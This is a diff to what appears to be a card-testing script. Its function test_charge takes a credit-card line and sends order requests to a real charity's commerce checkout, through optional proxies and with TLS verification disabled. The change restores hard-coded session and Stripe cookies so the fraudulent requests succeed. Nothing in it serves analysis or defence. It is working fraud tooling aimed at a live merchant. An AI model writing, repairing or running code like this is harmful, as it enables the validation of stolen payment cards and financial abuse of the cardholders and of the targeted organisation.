@@ -268,8 +268,8 @@ def test_charge(cc_line):
 
         cookies = {  
             'crumb': 'BdN_kVc7Dlf8M2E3YmFkZGFkZDk4M2NjYjAzZjZkZWJlNDA2YTBj',  
-            #'ss_cvr': '5e90dfdb-ab76-4349-8ffc-1d9e999c7c07|1761147863405|1761147863405|1761147863405|1',  
-           # 'ss_cvt': '1761147863405',  
+            'ss_cvr': '5e90dfdb-ab76-4349-8ffc-1d9e999c7c07|1761147863405|1761147863405|1761147863405|1',  
+            'ss_cvt': '1761147863405',  
             '__stripe_mid': '7b950d1e-0df3-409d-9e55-30a9793b59e7dff2e0',  
             '__stripe_sid': 'dffa9c3f-a190-45e8-9152-dc0686c4aa83442b9c',  
         }  
@@ -342,9 +342,9 @@ def test_charge(cc_line):
         }  
 
         if proxy_dict:
-            response1 = requests.post('https://www.onamissionkc.org/api/2/commerce/orders', headers=headers, json=json_data, proxies=proxy_dict, timeout=30, verify=False)
+            response1 = requests.post('https://www.onamissionkc.org/api/2/commerce/orders', headers=headers, cookies=cookies, json=json_data, proxies=proxy_dict, timeout=30, verify=False)
         else:
-            response1 = requests.post('https://www.onamissionkc.org/api/2/commerce/orders', headers=headers, json=json_data, timeout=30, verify=False)
+            response1 = requests.post('https://www.onamissionkc.org/api/2/commerce/orders', headers=headers, cookies=cookies, json=json_data, timeout=30, verify=False)
 
         apx1 = response1.json()
         
